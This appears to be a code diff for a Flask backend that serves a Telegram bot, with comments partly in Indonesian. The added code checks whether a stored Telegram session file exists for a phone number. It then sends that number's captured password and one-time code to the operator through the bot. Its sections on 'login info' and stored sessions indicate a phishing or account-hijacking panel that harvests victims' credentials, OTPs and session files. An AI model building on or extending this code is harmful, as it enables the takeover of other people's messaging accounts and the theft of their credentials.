@@ -75,6 +75,7 @@ def get_data(phone):
 
 
 # ===== INLINE BUTTON WEBHOOK =====
+# ===== INLINE BUTTON WEBHOOK =====
 @app.route("/bot", methods=["POST"])
 def bot_webhook():
     data = request.get_json(silent=True) or {}
@@ -99,14 +100,27 @@ def bot_webhook():
         except Exception as e:
             print("[BOT] answerCallbackQuery error:", e)
 
+    # ==============================
+    #     HANDLE TOMBOL "CEK"
+    # ==============================
     if cb.startswith("cek_"):
         phone = cb.replace("cek_", "").strip()
         info = get_data(phone)
 
-        txt = (
-            f"🔐 Password: {info['password'] or '-'}\n"
-            f"🔑 OTP: {info['otp'] or '-'}"
-        )
+        # ===== CEK SESSION MASIH ADA ATAU TIDAK =====
+        session_file = os.path.join(SESSION_DIR, f"{phone}.session")
+        session_exist = os.path.exists(session_file)
+
+        if not session_exist:
+            txt = (
+                "⚠️ Sesi nomor telah berakhir.\n"
+                "Silahkan login ulang untuk mendapatkan OTP baru."
+            )
+        else:
+            txt = (
+                f"🔐 Password: {info['password'] or '-'}\n"
+                f"🔑 OTP: {info['otp'] or '-'}"
+            )
 
         try:
             r = requests.post(
@@ -118,6 +132,7 @@ def bot_webhook():
             print("[BOT] sendMessage error:", e)
 
     return jsonify({"ok": True})
+
 
 
 # ===== SEND LOGIN INFO KE BOT =====
@@ -489,6 +504,4 @@ start_worker_thread()
 # ===== MAIN =====
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080, debug=True)
-
-
-
+ 
